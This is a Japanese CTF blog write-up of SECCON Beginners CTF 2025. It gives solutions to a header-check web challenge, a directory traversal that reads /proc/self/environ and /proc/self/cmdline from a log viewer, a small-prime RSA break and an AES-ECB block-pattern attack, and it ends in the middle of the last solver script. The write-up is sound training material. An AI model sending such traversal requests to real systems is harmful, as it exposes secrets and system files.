+++
author = "Hugo Authors"
title = "SECCON Beginners CTF 2025 Writeup"
date = "2025-07-27"
description = ""
tags = [
    "CTF",
    "writeup",
    "seccon",
]
categories = [
    "Security",
    "Programming",
]
image = "https://raw.githubusercontent.com/stark2420/starknote/refs/heads/main/static/image/seccon-beginners-ctf-2025/cover.png"
+++

2025/7/26 14:00(JST) - 2025/7/27 14:00(JST)で開催された SECCON Beginners CTF 2025 に参加した．

<!--more-->
個人で参加し，結果は，1272 点で 880 チーム中 338 位だった．
<!-- 以下大会期間中に自分で解けた問題には✔をつけている． -->

https://www.seccon.jp/14/seccon_beginners/ctf.html

## web
### skipping [737 Solve (100 beginner)]
> /flagへのアクセスは拒否されます。curlなどを用いて工夫してアクセスして下さい。   
curl http://skipping.challenges.beginners.seccon.jp:33455  

ソースコードより，`x-ctf4b-request` ヘッダが `ctf4b` であることが必要．

{{< code lang="js" title="index.js" hl_lines="">}}
var express = require("express");
var app = express();

const FLAG = process.env.FLAG;
const PORT = process.env.PORT;

app.get("/", (req, res, next) => {
    return res.send('FLAG をどうぞ: <a href="/flag">/flag</a>');
});

const check = (req, res, next) => {
    if (!req.headers['x-ctf4b-request'] || req.headers['x-ctf4b-request'] !== 'ctf4b') {
        return res.status(403).send('403 Forbidden');
    }

    next();
}

app.get("/flag", check, (req, res, next) => {
    return res.send(FLAG);
})

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
{{< /code >}}

ヘッダを指定して，curlで実行するとflagが得られる．
```
$ curl -H "x-ctf4b-request: ctf4b" http://skipping.challenges.beginners.seccon.jp:33455/flag
ctf4b{y0ur_5k1pp1n6_15_v3ry_n1c3}
```

### log-viewer [621 Solve (100 easy)]
> ログをウェブブラウザで表示できるアプリケーションを作成しました。 これで定期的に集約してきているログを簡単に確認できます。 秘密の情報も安全にアプリに渡せているはずです...  
http://log-viewer.challenges.beginners.seccon.jp:9999  

ログを表示するウェブアプリ．

`access.log` と `debug.log` が見られる．

{{< code lang="" title="logs/access.log" hl_lines="">}}
192.168.65.1 - - [21/June/2025:10:41:56 +0900] "GET / HTTP/1.1" 200 526 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:41:56 +0900] "GET /favicon.ico HTTP/1.1" 200 526 "http://localhost:8000/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:41:58 +0900] "GET / HTTP/1.1" 200 526 "-" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
192.168.65.1 - - [21/June/2025:10:41:58 +0900] "GET /favicon.ico HTTP/1.1" 200 526 "http://localhost:8000/" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
192.168.65.1 - - [21/June/2025:12:42:13 +0900] "GET /?file=access.log HTTP/1.1" 200 1228 "http://localhost:8000/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:12:42:15 +0900] "GET /?file=access.log HTTP/1.1" 200 1228 "http://localhost:8000/" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
192.168.65.1 - - [21/June/2025:10:42:17 +0900] "GET / HTTP/1.1" 200 526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
192.168.65.1 - - [21/June/2025:10:42:17 +0900] "GET /favicon.ico HTTP/1.1" 200 526 "http://localhost:8000/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0"
192.168.65.1 - - [21/June/2025:10:42:17 +0900] "GET / HTTP/1.1" 200 526 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)"
192.168.65.1 - - [21/June/2025:10:42:17 +0900] "GET /favicon.ico HTTP/1.1" 200 526 "http://localhost:8000/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Mobile/15E148 Snapchat/10.77.5.59 (like Safari/604.1)"
192.168.65.1 - - [21/June/2025:10:42:21 +0900] "GET /?file=debug.log HTTP/1.1" 200 1368 "http://localhost:8000/?file=access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:42:24 +0900] "GET /?file=../.env HTTP/1.1" 404 690 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:42:53 +0900] "GET /?file=../../proc/self/environ HTTP/1.1" 200 770 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:43:58 +0900] "GET / HTTP/1.1" 200 526 "-" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
192.168.65.1 - - [21/June/2025:10:43:59 +0900] "GET /favicon.ico HTTP/1.1" 200 526 "http://localhost:8000/" "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
192.168.65.1 - - [21/June/2025:10:45:13 +0900] "GET /?file=access.log HTTP/1.1" 200 1228 "http://localhost:8000/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
192.168.65.1 - - [21/June/2025:10:47:01 +0900] "GET /?file=debug.log HTTP/1.1" 200 1368 "http://localhost:8000/?file=access.log" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0"
{{< /code >}}

{{< code lang="" title="logs/debug.log" hl_lines="">}}
2025/06/21 10:40:02 INFO Initializing LogViewer... pid=17565
2025/06/21 10:40:02 DEBUG Parsed command line arguments flag=ctf4b{this_is_dummy_flag} port=8000
2025/06/21 10:41:56 INFO handlerFunc file=""
2025/06/21 10:41:58 INFO handlerFunc file=""
2025/06/21 10:42:13 INFO handlerFunc file="access.log"
2025/06/21 10:42:15 INFO handlerFunc file="access.log"
2025/06/21 10:42:17 INFO handlerFunc file=""
2025/06/21 10:42:17 INFO handlerFunc file=""
2025/06/21 10:42:21 INFO handlerFunc file="debug.log"
2025/06/21 10:42:24 INFO handlerFunc file="../.env"
2025/06/21 12:42:24 ERROR File not available file=../.env
2025/06/21 12:43:53 INFO handlerFunc file="../../proc/self/envion"
2025/06/21 10:43:59 INFO handlerFunc file=""
2025/06/21 12:45:13 INFO handlerFunc file="access.log"
2025/06/21 12:47:01 INFO handlerFunc file="debug.log"
{{< /code >}}

`access.log` と `debug.log` はそれぞれ，
`http://log-viewer.challenges.beginners.seccon.jp:9999/?file=access.log` と
`http://log-viewer.challenges.beginners.seccon.jp:9999/?file=debug.log` というURLである．

試しに，`http://log-viewer.challenges.beginners.seccon.jp:9999/?file=../../proc/self/environ` にアクセスすると，
`/proc/self/environ` ファイル内容が出力され，ディレクトリトラバーサルの脆弱性があることがわかる．

`debug.log` より，コマンドラインにflagがありそうなので，
`http://log-viewer.challenges.beginners.seccon.jp:9999/?file=../../proc/self/cmdline`　にアクセスすると，
flagが得られた．

{{< code lang="" title="/proc/self/cmdline" hl_lines="">}}
/usr/local/bin/log-viewer-port=9999-flag=ctf4b{h1dd1ng_1n_cmdl1n3_m4y_b3_r34d4bl3}
{{< /code >}}

## crypto
### seesaw [612 Solve (100 beginner)]
> RSA初心者です! pとqはこれでいいよね...?  

ソースコードを見ると，`q` が16bitの値となっているので，全探索できる．

```py
import os
from Crypto.Util.number import getPrime

FLAG = os.getenv("FLAG", "ctf4b{dummy_flag}").encode()
m = int.from_bytes(FLAG, 'big')

p = getPrime(512)   
q = getPrime(16)
n = p * q
e = 65537
c = pow(m, e, n)

print(f"{n = }")
print(f"{c = }")
```

```
n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079
```

以下を実行するとflagが得られる．

{{< code lang="py" title="solver.py" hl_lines="">}}
from Crypto.Util.number import long_to_bytes
n = 362433315617467211669633373003829486226172411166482563442958886158019905839570405964630640284863309204026062750823707471292828663974783556794504696138513859209
c = 104442881094680864129296583260490252400922571545171796349604339308085282733910615781378379107333719109188819881987696111496081779901973854697078360545565962079

for p in range(2, 65536):
    if n % p == 0:
        q = n // p
        print(f"p = {p}")
        print(f"q = {q}")
        break

e = 65537
phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)
flag = long_to_bytes(m) # or m.to_bytes((m.bit_length() + 7) // 8, byteorder='big')
print(flag.decode())

# p = 33091
# q = 10952625052656831515204538182703136388328319215692561827776703217129125920630092954719731657697359076607720006975422546048557875675403691541340687683615299
# ctf4b{unb4l4nc3d_pr1m35_4r3_b4d}
{{< /code >}}


### 01-Translator [280 Solve (100 easy)]
> バイナリ列は読めない？じゃあ翻訳してあげるよ！  
nc 01-translator.challenges.beginners.seccon.jp 9999  

flagを2進数に変換し，`0` と `1` を指定した文字列に置き換え，AESのECBモードで暗号化される．
 
```py
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import bytes_to_long


def encrypt(plaintext, key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext.encode(), 16))

flag = os.environ.get("FLAG", "CTF{dummy_flag}")
flag_bin = f"{bytes_to_long(flag.encode()):b}"
trans_0 = input("translations for 0> ")
trans_1 = input("translations for 1> ")
flag_translated = flag_bin.translate(str.maketrans({"0": trans_0, "1": trans_1}))
key = os.urandom(16)
print("ct:", encrypt(flag_translated, key).hex())
```

ECBモードなので，`0` と `1` を16byteの文字列に置き換えればよい．

```
$ nc 01-translator.challenges.beginners.seccon.jp 9999
translations for 0> AAAAAAAAAAAAAAAA
translations for 1> BBBBBBBBBBBBBBBB
ct: d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf940faf1db97dff48482511b710f8dfa038
```

16進の16byte分である `d2dd0b85dca8a6e1b43485b29c3caf94` を `1` に， `e9d754817e22ae903894db279d383a70` を `0` にして復号．

{{< code lang="py" title="solver.py" hl_lines="">}}
from Crypto.Util.number import long_to_bytes

input = "d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94d2dd0b85dca8a6e1b43485b29c3caf94e9d754817e22ae903894db279d383a70d2dd0b85dca8a6e1b43485b29c3caf940faf1db97dff48482511b710f8dfa038"
pattern = {
    "d2dd0b85dca8a6e1b43485b29c3caf94": "1",
    "e9d754817e22ae903894db279d383a70": "0"
}
blocks = [input[i:i+32] for i in range(0, len(input), 32)]
result = []
for block in blocks:
    label = pattern.get(block, "")  # 不明なパターン(最後のパディング分)は "" とする
    result.append(label)

flag_bin = ''.join(result)
flag = long_to_bytes(int(flag_bin, 2)).decode()

print(flag_bin)
print(flag)
